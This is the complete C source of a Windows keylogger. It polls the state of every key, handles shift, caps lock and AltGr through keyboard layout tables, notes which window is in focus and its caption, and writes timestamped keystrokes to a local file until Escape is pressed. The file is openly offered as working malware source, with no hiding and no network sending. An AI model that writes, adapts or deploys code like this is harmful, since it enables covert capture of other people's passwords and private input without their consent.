/*
	Author: Axel Isaksson (h4xxel)
	http://h4xxel.ath.cx/
*/

#include <stdio.h>
#include <time.h>
#include <windows.h>
#include <string.h>
#include <winsock2.h>
#include "layout.h"

time_t t;
FILE *logfile;

char* get_timestamp() {
	t=time(NULL);
	return ctime(&t);
}

void log_msg(char* message) {
	fprintf(logfile, "%s %s", message, get_timestamp());
}

void clear_buffer() {
	int i;
	for(i=1;i<256;i++)
		GetAsyncKeyState(i);
}

int main() {
	int key_state;
	short shift_state, caps_state, altgr_state;
	char buf[256], current_title[256], last_title[256];
	HWND current_win, last_win;
	logfile=fopen("out.txt", "w");
	log_msg("***Starting keylogger");
	clear_buffer();
	while(1) {
		int i;
		last_win=current_win;
		current_win=GetForegroundWindow();
		if(current_win!=NULL) {
			GetWindowText(current_win, current_title, 256);
			if(current_win==last_win&&strcmp(last_title, current_title)) {
				sprintf(buf, "\n***Window caption change [%s]", current_title);
				log_msg(buf);
			} else if(current_win!=last_win) {
				sprintf(buf, "\n***Focused window [%s]", current_title);
				log_msg(buf);
			}
			strcpy(last_title, current_title);
		}
		
		//get state of shift and caps keys
		shift_state=(GetAsyncKeyState(VK_SHIFT)>>15)&1;
		altgr_state=(GetAsyncKeyState(VK_RMENU)>>15)&1;
		caps_state=GetKeyState(VK_CAPITAL)&1;

		//check all keys against layout
		for(i=1;i<256;i++) {
			if(altgr_state) {
				if((GetAsyncKeyState(i)&0xEF)&&layout_altgr[i-1])
					fputc(layout_altgr[i-1],logfile);
			} else if((shift_state^(caps_state&&((i>0x40&&i<0x60)||i==VK_OEM_8||i==VK_OEM_7||i==VK_OEM_3)))) {
				if((GetAsyncKeyState(i)&0xEF)&&layout_shift[i-1])
					fputc(layout_shift[i-1],logfile);
			} else {
				if((GetAsyncKeyState(i)&0xEF)&&layout[i-1])
					fputc(layout[i-1],logfile);
			}
		}

		if(GetAsyncKeyState(VK_ESCAPE))
			break;
		fflush(logfile);
		sleep(1);
	}
	log_msg("\n***Shutting down");
	fclose(logfile);
	return 0;
}
